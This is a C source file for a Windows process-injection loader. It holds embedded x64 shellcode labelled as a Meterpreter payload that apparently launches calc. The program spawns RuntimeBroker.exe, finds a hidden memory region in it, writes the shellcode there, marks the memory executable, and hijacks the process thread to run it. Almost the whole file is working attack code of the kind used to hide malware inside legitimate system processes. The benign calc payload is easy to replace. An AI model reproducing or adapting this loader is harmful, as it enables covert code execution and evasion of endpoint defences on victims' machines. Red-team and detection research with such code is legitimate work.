#include "Snap.h"

/* -- CalcPayload.bin -- METERPRETER -- x64 --
   StartOffset(h): 00000000, EndOffset(h): 0000010F, Length(h): 00000110 */

unsigned char buf[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

BOOL InjectAndRwx(HANDLE hProcess, PVOID ShellcodeLocation, SIZE_T sizeofshellcode);

void main() {
	BOOL Success;
	char lbuffer[1024];
	char cmdbuff[1024];
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	SIZE_T sizeofshellcode = sizeof(buf);
	GetEnvironmentVariableA("windir", lbuffer, 1024);
	_snprintf(cmdbuff, 1024, "%s\\System32\\RuntimeBroker.exe", lbuffer);
	if (!CreateProcessA(
		NULL,
		cmdbuff,
		NULL,
		NULL,
		TRUE,
		NORMAL_PRIORITY_CLASS | DETACHED_PROCESS | DEBUG_PROCESS,
		NULL,
		NULL,
		(LPSTARTUPINFOA)&si,
		&pi)) {
		printf("[!] CreateProcessA FAILED with Error : %d \n", GetLastError());
		return -1;
	}
	int pid = pi.dwProcessId;
	int tid = pi.dwThreadId;
	HANDLE hProcess = pi.hProcess;
	HANDLE hThread = pi.hThread;

	printf("[i] RuntimeBroker Created with pid : %d \n", pid);
	
	PVOID ShellcodeLocation;
	Success = GetHiddenInjectionAddress(hProcess, sizeofshellcode, &ShellcodeLocation);
	if (Success == FALSE) {
		printf("[!] GetHiddenInjectionAddress FAILED with Error : %d \n", GetLastError());
		return -1;
	}
	printf("[+] %-20s : 0x%-016p\n", "ShellcodeLocation addr", (void*)ShellcodeLocation);
	if (ShellcodeLocation == NULL){
		printf("[!] ShellcodeLocation IS NULL \n");
		return -1;
	}

	InjectAndRwx(hProcess, ShellcodeLocation, sizeofshellcode);

	printf("[+] Press Any Key To Hijack The Thread ...\n");
	getchar();
	Success = SnapThreadHijack(pid, hThread, tid, hProcess, &ShellcodeLocation, NULL);
	if (Success == FALSE) {
		printf("[!] \"SnapThreadHijack\" FAILED with Error : %d \n", GetLastError());
	}

	printf("[+] Press Any Key To exit ...\n");
	getchar();
}

//this function is used to inject your shellcode and make memory permissions executable
BOOL InjectAndRwx(HANDLE hProcess, PVOID ShellcodeLocation, SIZE_T sizeofshellcode) {
	DWORD Old;
	SIZE_T dwBytesCopied;
	BOOL Success;
	
	Success = VirtualProtectEx(hProcess, ShellcodeLocation, sizeofshellcode, PAGE_READWRITE, &Old);
	if (Success == FALSE){
		printf("[!] [1] VirtualProtectEx FAILED with Error : %d \n", GetLastError());
		return FALSE;
	}

	Success = WriteProcessMemory(hProcess, ShellcodeLocation, &buf, sizeofshellcode, &dwBytesCopied);
	//printf("[+] Wrote: %ld\n", dwBytesCopied);
	if (Success == FALSE) {
		printf("[!] WriteProcessMemory FAILED with Error : %d \n", GetLastError());
		return FALSE;
	}
	Success = VirtualProtectEx(hProcess, ShellcodeLocation, sizeofshellcode, PAGE_EXECUTE_READWRITE, &Old);
	if (Success == FALSE) {
		printf("[!] [2] VirtualProtectEx FAILED with Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
